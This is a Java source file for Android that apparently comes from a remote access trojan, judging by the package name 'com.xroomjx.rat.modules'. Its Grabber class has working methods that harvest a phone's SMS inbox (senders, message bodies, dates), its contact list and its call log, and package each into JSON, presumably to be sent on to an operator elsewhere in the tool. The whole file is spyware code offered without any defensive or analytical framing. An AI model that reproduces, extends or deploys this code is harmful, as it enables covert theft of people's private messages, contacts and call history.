package com.xroomjx.rat.modules;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

public class Grabber {
    public static String grabSMS(Context context) {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.Inbox.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    arr.put(sms);
                }
                cursor.close();
            }
            return arr.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    public static String grabContacts(Context context) {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)));
                    contact.put("id", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)));
                    arr.put(contact);
                }
                cursor.close();
            }
            return arr.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    public static String grabCallLog(Context context) {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    arr.put(call);
                }
                cursor.close();
            }
            return arr.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
